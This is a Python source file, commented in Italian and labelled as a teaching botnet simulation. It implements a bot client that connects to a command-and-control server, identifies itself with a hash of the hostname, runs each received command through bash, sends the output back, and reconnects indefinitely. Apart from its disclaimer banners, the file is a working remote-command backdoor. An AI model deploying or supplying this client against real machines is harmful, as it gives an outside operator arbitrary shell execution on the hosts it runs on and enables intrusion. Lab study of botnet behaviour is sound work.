#!/usr/bin/env python3
"""
Client Bot per simulazione botnet didattica
Utilizzare solo in ambienti controllati per scopi educativi
"""

import socket
import time
import hashlib
import random
import logging
import subprocess
import tempfile
import os
import sys

class BotClient:
    def __init__(self, server_ip, server_port=8000):
        self.server_ip = server_ip
        self.server_port = server_port
        self.bot_id = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
        self.setup_logging()
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('bot_client.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(f'Bot_{self.bot_id}')
    
    def connect_to_c2(self):
        """Tenta di connettersi al server C2"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.server_ip, self.server_port))
            self.logger.info(f"Connesso al server C2 {self.server_ip}:{self.server_port}")
            return sock
        except Exception as e:
            self.logger.error(f"Errore di connessione: {str(e)}")
            return None
    
    def execute_command(self, command):
        """Esegue un comando e restituisce l'output"""
        try:
            # Salva il comando in un file temporaneo
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.sh') as f:
                f.write("#!/bin/bash\n")
                f.write("# Comando eseguito dal bot\n")
                f.write(command)
                temp_script = f.name
            
            # Rende eseguibile ed esegue
            os.chmod(temp_script, 0o755)
            result = subprocess.run(
                ['/bin/bash', temp_script],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Pulizia
            os.remove(temp_script)
            
            output = f"EXIT_CODE: {result.returncode}\n"
            output += f"STDOUT: {result.stdout}\n" if result.stdout else "STDOUT: \n"
            output += f"STDERR: {result.stderr}\n" if result.stderr else "STDERR: \n"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "ERROR: Command timed out after 60 seconds"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_communication(self, sock):
        """Gestisce la comunicazione con il server C2"""
        try:
            # Invio identificazione
            sock.send(f"BOT_ID:{self.bot_id}".encode('utf-8'))
            
            while True:
                # Riceve comando dal server
                command = sock.recv(4096).decode('utf-8').strip()
                
                if not command:
                    break
                
                if command == "PING":
                    sock.send(b"PONG")
                    self.logger.debug("Richiesta PING ricevuta")
                elif command == "SHUTDOWN":
                    self.logger.info("Comando SHUTDOWN ricevuto")
                    sock.send(b"SHUTTING_DOWN")
                    return False
                else:
                    # Esegue comando generico
                    self.logger.info(f"Eseguo comando: {command[:50]}...")
                    result = self.execute_command(command)
                    sock.send(result.encode('utf-8'))
                
        except socket.timeout:
            self.logger.warning("Timeout nella comunicazione con il server")
            return True
        except Exception as e:
            self.logger.error(f"Errore di comunicazione: {str(e)}")
            return True
        
        return True
    
    def run(self):
        """Loop principale del bot"""
        self.logger.info(f"Avvio bot {self.bot_id}")
        
        while True:
            self.logger.info(f"Tentativo di connessione a {self.server_ip}:{self.server_port}")
            sock = self.connect_to_c2()
            
            if sock:
                try:
                    should_continue = self.handle_communication(sock)
                    if not should_continue:
                        break
                except Exception as e:
                    self.logger.error(f"Errore durante la comunicazione: {str(e)}")
                finally:
                    sock.close()
                    self.logger.info("Connessione chiusa")
            
            # Attesa prima di riconnettersi
            wait_time = random.randint(30, 60)
            self.logger.info(f"Tentativo di riconnessione in {wait_time} secondi...")
            time.sleep(wait_time)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Bot Client per simulazione didattica')
    parser.add_argument('server_ip', help='IP del server C2')
    parser.add_argument('-p', '--port', type=int, default=8000, help='Porta del server C2')
    
    args = parser.parse_args()
    
    print("🤖 Bot Client Didattico")
    print("⚠️  USO ESCLUSIVAMENTE DIDATTICO")
    print(f"📍 Server C2: {args.server_ip}:{args.port}")
    print("")
    
    try:
        bot = BotClient(args.server_ip, args.port)
        bot.run()
    except KeyboardInterrupt:
        print("\n🛑 Bot client interrotto dall'utente")
    except Exception as e:
        print(f"❌ Errore: {e}")

if __name__ == "__main__":
    main()
